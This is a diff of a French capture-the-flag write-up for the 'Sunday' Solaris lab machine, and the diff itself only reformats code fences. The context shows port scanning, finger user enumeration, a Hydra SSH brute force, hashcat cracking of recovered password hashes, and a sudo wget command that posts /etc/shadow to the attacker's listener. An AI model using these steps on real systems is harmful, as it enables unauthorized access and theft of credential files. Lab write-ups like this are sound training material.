@@ -15,7 +15,7 @@ Wednesday's Child
 
 Ce qui a été bien plus perturbant sur ce CTF c'est la façon dont la machine pouvait répondre à nos scans de ports :  
 
-```plain
+```
 Nmap scan report for 10.10.10.76
 Host is up (0.038s latency).
 
@@ -32,7 +32,7 @@ Certes, certes...
 
 Essayons de fragmenter les paquets et de les rendre moins typés :  
 
-```plain
+```
 devloop@kali:~$ sudo nmap -T5 -f 10.10.10.76 -p-  --data-length 18
 [sudo] Mot de passe de devloop : 
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-05 17:52 CEST
@@ -51,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 895.68 seconds
 
 Allez essaye encore :  
 
-```plain
+```
 devloop@kali:~$ sudo masscan -e tun0 --rate 200 -p1-65535 10.10.10.76
 
 Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2018-06-14 08:38:20 GMT
@@ -66,7 +66,7 @@ Discovered open port 49333/tcp on 10.10.10.76
 
 Le port 22022 s'avère être un SSH (SunSSH). Quand au finger on peut le questionner un peu moins gentiment avec Metasploit :  
 
-```plain
+```
 msf auxiliary(scanner/finger/finger_users) > exploit
 
 [+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sunny
@@ -95,7 +95,7 @@ msf auxiliary(scanner/finger/finger_users) > exploit
 
 Il y a de l'activité sur le compte *sunny* :  
 
-```plain
+```
 devloop@kali:~$ finger -l sunny@10.10.10.76
 Login name: sunny               In real life: sunny
 Directory: /export/home/sunny           Shell: /bin/bash
@@ -119,7 +119,7 @@ Les IPs sont celles d'autres participants. L'emplacement du home de l'utilisateu
 
 Faute de mieux on brute-force le compte et on se trouve un peu bête devant le mot de passe trouvé :  
 
-```plain
+```
 devloop@kali:~$ hydra -l sunny -P /usr/share/ncrack/top50000.pwd ssh://10.10.10.76:22022
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -136,7 +136,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-14 21:35:16
 
 On obtient alors notre accès sur la machine mais pas encore de flag.  
 
-```plain
+```
 sunny@sunday:~$ uname -a
 SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
 
@@ -153,7 +153,7 @@ sunny    pts/8         9:35am                      w
 
 Je trouve quelques fichiers bizarres sur la machine :  
 
-```plain
+```
 sunny@sunday:~$ file ./Desktop/core
 ./Desktop/core: ELF 32-bit LSB core file 80386 Version 1, from 'packagemanager'
 sunny@sunday:~$ file ./Downloads/reverse.solaris.x86.1337.elf
@@ -164,7 +164,7 @@ Le second est potentiellement le reverse-shell d'un autre participant. Quand au 
 
 Il y a un programme utilisable via sudo mais qui ne semblait pas exploitable via des failles classiques :  
 
-```plain
+```
 sunny@sunday:~$ sudo -l
 User sunny may run the following commands on this host:
     (root) NOPASSWD: /root/troll
@@ -175,14 +175,14 @@ Copyright (C) 2005 Free Software Foundation, Inc.
 
 Encore une bizarrerie :  
 
-```plain
+```
 sunny@sunday:/etc$ ls -l /var/adm/spellhist
 -rw-rw-rw- 1 root bin 0 2009-05-14 21:18 /var/adm/spellhist
 ```
 
 Finalement je trouve des hashs dans un dossier backup :  
 
-```plain
+```
 sunny@sunday:/backup$ ls -l
 total 2
 -r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
@@ -203,7 +203,7 @@ sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 
 Si on cherche des mentions de l'utilisateur *sammy* sur le système on en trouve dans le fichier */var/sadm/system/logs/install\_log* :  
 
-```plain
+```
 <OM Apr 15 14:22:31> /sbin/install-finish  -B '/a' -R '$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD' -n 'sammy' -l 'sammy' -p '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB' -G '10' -U '101'
 <ICT Apr 15 14:22:32> Starting Python script of Install Completion Tasks
 <ICT Apr 15 14:22:32> BASEDIR: /a
@@ -220,7 +220,7 @@ Si on cherche des mentions de l'utilisateur *sammy* sur le système on en trouve
 
 Il est temps de faire chauffer le processeur (faute de mieux) :  
 
-```plain
+```
 $ ./hashcat64.bin -m 7400 -a 0 /tmp/hashes.txt /opt/wordlists/rockyou.txt
  hashcat (v4.1.0) starting...
 
@@ -262,7 +262,7 @@ Une fois connecté avec le compte *sammy* on obtient notre flag (*a3d9498027ca51
 
 Et on dispose d'une entrée sudo intéressante :  
 
-```plain
+```
 sammy@sunday:~$ sudo -l
 User sammy may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/wget
@@ -282,7 +282,7 @@ sudo /usr/bin/wget --post-file /etc/shadow http://10.10.15.90:8080/
 
 Et c'est dans la poche :  
 
-```plain
+```
 devloop@kali:/tmp$ ncat -l -p 8080 -v
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::8080
